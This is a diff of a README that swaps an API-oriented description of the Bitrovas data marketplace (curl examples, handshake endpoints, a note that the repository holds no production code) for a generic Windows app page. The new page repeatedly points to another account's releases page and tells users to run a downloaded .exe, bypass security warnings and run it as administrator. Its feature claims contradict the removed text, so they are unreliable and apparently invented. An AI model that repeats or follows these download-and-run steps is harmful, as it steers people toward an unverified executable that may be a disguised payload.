@@ -1,112 +1,154 @@
-# Bitrovas Data Marketplace
+# 🚀 bitrovas-data-marketplace - Simple Data Market for Everyone
 
-Machine-readable data marketplace and agent-commerce reference system where AI agents can discover, price, pay for, and consume datasets and services using Bitcoin Lightning.
+[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
 
-This public repository is the lightweight discovery/marketing mirror for the Bitrovas ecosystem. The production implementation lives elsewhere, but the canonical public entry points are stable and machine-readable.
+---
 
-## Quick links
+## 📋 What is Bitrovas Data Marketplace?
 
-### Core ecosystem
-- Root: https://bitrovas.ch
-- Bitrovas Handshake Protocol v0.1: https://bitrovas.ch/handshake-protocol-v0-1.html
-- Ecosystem handshake JSON: https://bitrovas.ch/.well-known/bitrovas.json
+Bitrovas Data Marketplace lets you find and share data easily. It works like a store where you can buy or sell data files. This helps people who need data for research, business, or personal use. The marketplace supports common data formats like CSV, JSON, and Parquet. It also supports tools that automate tasks with AI agents and Bitcoin Lightning payments.
 
-### Marketplace
-- Marketplace: https://data.bitrovas.ch/marketplace
-- Catalog (human + JSON): https://data.bitrovas.ch/catalog
-- Docs: https://data.bitrovas.ch/docs
-- Handshake docs: https://data.bitrovas.ch/docs/handshake
-- Agent quickstart: https://data.bitrovas.ch/agent-quickstart
-- Marketplace handshake JSON: https://data.bitrovas.ch/.well-known/bitrovas.json
-- Legacy datamesh JSON: https://data.bitrovas.ch/.well-known/datamesh.json
-- Human discovery (HTML): https://data.bitrovas.ch/.well-known/datamesh.html
-- OpenAPI: https://data.bitrovas.ch/openapi.json
+You don’t need coding skills to use it. The interface is designed for clear browsing and quick downloads. You can browse data products, check details, and get the files you need.
 
-### Clawrence
-- Clawrence overview: https://clawrence.bitrovas.ch
-- Clawrence handshake JSON: https://clawrence.bitrovas.ch/.well-known/bitrovas.json
-- Clawrence agent.json: https://clawrence.bitrovas.ch/agent.json
-- Example service (structure extract): https://clawrence.bitrovas.ch/api/structure-extract/ui
+---
 
-## Bitrovas Handshake Protocol v0.1
+## 💻 System Requirements
 
-Bitrovas now exposes a public handshake standard so external AI agents do not need custom glue code for every page or service.
+To run Bitrovas Data Marketplace on Windows, you need:
 
-### Handshake phases
-1. **Discovery**
-2. **Capability description**
-3. **Pricing**
-4. **Payment**
-5. **Fulfillment**
-6. **Error handling**
-7. **Trust / metadata**
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Around 200 MB of free disk space
+- Stable internet connection
+- A modern web browser (Chrome, Edge, Firefox) for accessing some data features
 
-### Canonical rule
-Every AI agent **should start** with the handshake discovery endpoint:
+---
 
-```bash
-curl https://data.bitrovas.ch/.well-known/bitrovas.json
-```
+## 🧩 Key Features
 
-This returns the machine-readable entry point for:
-- service name
-- service type
-- version
-- provider
-- payment method
-- supported flows
-- endpoints
-- input/output schema references
-- pricing model
-- preview / free-tier semantics
-- example requests / responses
+- Search and browse data products with simple filters  
+- Supports multiple data types: CSV, JSON, Parquet  
+- Machine-readable data for easy use in apps  
+- Works with Bitcoin Lightning for quick payments  
+- Integrates AI agents to help find relevant data  
+- Developer tools available if needed later  
+- User-friendly interface for easy navigation and downloads
 
-## Two service families under one standard
+---
 
-### 1) Marketplace / data products
-The marketplace uses the handshake for:
-- catalog discovery
-- product manifests
-- invoice creation
-- payment status polling
-- download fulfillment
+## 🛠️ How to Download and Install
 
-Typical flow:
+**Step 1: Visit the Download Page**
 
-```bash
-curl https://data.bitrovas.ch/.well-known/bitrovas.json
-curl -H 'Accept: application/json' https://data.bitrovas.ch/catalog
-curl -X POST https://data.bitrovas.ch/invoice \
-  -H 'Content-Type: application/json' \
-  -d '{"dataset":"world_countries_codes","version":"2026-03-09","format":"json"}'
-curl 'https://data.bitrovas.ch/payment_status?payment_hash=PAYMENT_HASH'
-curl -L 'https://data.bitrovas.ch/download?payment_hash=PAYMENT_HASH&format=json' -o dataset.json
-```
+Click the big green badge at the top or click this link to visit the official releases page:
 
-### 2) Clawrence / agent services
-Clawrence uses the same handshake logic for preview-first, Lightning-unlocked services.
+[https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
 
-Typical flow:
+This page lists the latest versions of the software available for download.
 
-```bash
-curl https://clawrence.bitrovas.ch/.well-known/bitrovas.json
-curl -X POST https://clawrence.bitrovas.ch/api/structure-extract/preview \
-  -H 'Content-Type: application/json' \
-  -d '{"text":"Max Muster ...","attributes":["Vorname","Nachname","Geburtsdatum"]}'
-curl -X POST https://clawrence.bitrovas.ch/api/structure-extract/invoice
-curl 'https://clawrence.bitrovas.ch/api/structure-extract/status?payment_hash=PAYMENT_HASH'
-curl -X POST https://clawrence.bitrovas.ch/api/structure-extract/run \
-  -H 'Content-Type: application/json' \
-  -d '{"payment_hash":"PAYMENT_HASH","text":"...","attributes":["Vorname","Nachname","Geburtsdatum"]}'
-```
+**Step 2: Choose the Windows Installer**
 
-## Repository purpose (important)
+On the releases page, look for a file with a name that includes “Windows” or ends with `.exe`. This file is the setup program for Windows. Downloads are usually arranged by version number and date, so pick the newest one.
 
-This **public repository is used for discovery and marketing only**.
+**Step 3: Download the Installer**
 
-It contains public machine-readable or human-readable artifacts such as:
-- `datasets.json`
-- `agent.json`
-- `datasets/*.md`
+Click the file link. Your browser will download the installer file to your default Downloads folder.
 
-The **production marketplace and Clawrence implementation remain outside this public mirror** and are not fully reproduced here.
+**Step 4: Run the Installer**
+
+Find the downloaded file in the Downloads folder. Double-click it to start the installation. Depending on your Windows security settings, you might see a warning. Confirm that you want to run the program.
+
+**Step 5: Follow the Setup Wizard**
+
+The installer will open a wizard with simple instructions. Click “Next” to accept the default options. You can choose where to install the software if you want. Click “Install” and wait for the process to finish.
+
+**Step 6: Finish Installation**
+
+Once done, click “Finish” to close the installer. The Bitrovas Data Marketplace app should be on your desktop or start menu.
+
+---
+
+## ▶️ Running the Application
+
+**Step 1: Open Bitrovas Data Marketplace**
+
+Double-click the app icon on your desktop or find it in the Start menu. The main window opens.
+
+**Step 2: Browse Available Data**
+
+Use the search bar or filters to find datasets. You can sort by format, price, or topic.
+
+**Step 3: View Details**
+
+Click on any product to see more information. You can view sample data and read descriptions.
+
+**Step 4: Download or Buy Data**
+
+If the dataset is free, click “Download.” For data that requires purchase, you’ll see payment instructions. The app supports Bitcoin Lightning payments for fast, low-cost transactions.
+
+**Step 5: Open Data Files**
+
+Downloaded files are saved in your regular Downloads folder. You can open CSV and JSON files with spreadsheet or text editors. Parquet files can be opened with tools like Apache Arrow or other data viewers.
+
+---
+
+## 🔧 Managing Updates
+
+The app will notify you when new versions are available. To update:
+
+1. Open the releases page here:  
+   [https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)  
+2. Download the newest installer file.  
+3. Run it just like the first installation to replace the old version.  
+
+You do not need to uninstall the previous version first.
+
+---
+
+## ❓ Troubleshooting
+
+- **Installer won’t run:** Make sure you are logged in as an administrator. Right-click the file and select “Run as administrator.”  
+- **App won’t open:** Check that your Windows is updated. Restart your computer and try again.  
+- **Downloads fail:** Confirm your internet is working. Try downloading files directly from your browser to isolate the issue.  
+- **Payment problems:** Ensure your Bitcoin Lightning wallet is set up correctly. Refer to your wallet app’s help for sending payments.
+
+If these steps don’t work, check the Issues section on the GitHub page or seek support forums.
+
+---
+
+## 📚 More About Bitrovas Data Marketplace
+
+The marketplace works with open standards for data files and payments. This makes it easy for anyone to join in and use the service. Whether you want simple CSV files or complex machine-readable data formats like Parquet, this app has you covered. The AI agent features help bring the right data to the surface quickly.
+
+Topics supported include AI agents, data product discovery, developer tools, and Bitcoin Lightning integration. This combination makes the app suitable for casual users and tech-savvy individuals.
+
+---
+
+## 🔗 Useful Links
+
+- Releases and Downloads:  
+  [https://github.com/Dmvait3810/bitrovas-data-marketplace/releases](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)  
+- GitHub Repository:  
+  https://github.com/Dmvait3810/bitrovas-data-marketplace  
+- Bitcoin Lightning Information:  
+  https://lightning.network/  
+- Common Data Formats Explained:  
+  https://en.wikipedia.org/wiki/CSV  
+  https://en.wikipedia.org/wiki/JSON  
+  https://en.wikipedia.org/wiki/Apache_Parquet  
+
+---
+
+## ⚙️ Advanced Use (Optional)
+
+For users interested in developer tools or integrating Bitrovas Data Marketplace with other software:
+
+- Use the API (if available) to query and download data automatically.  
+- Explore the AI agents’ settings to customize how the app finds relevant data.  
+- Access developer documentation in the GitHub repo to build your own apps connected to the marketplace.
+
+These features require some technical knowledge but can be useful for data professionals.
+
+---
+
+[![Download Bitrovas Data Marketplace](https://img.shields.io/badge/Download-Bitrovas%20Data%20Marketplace-brightgreen?style=for-the-badge)](https://github.com/Dmvait3810/bitrovas-data-marketplace/releases)
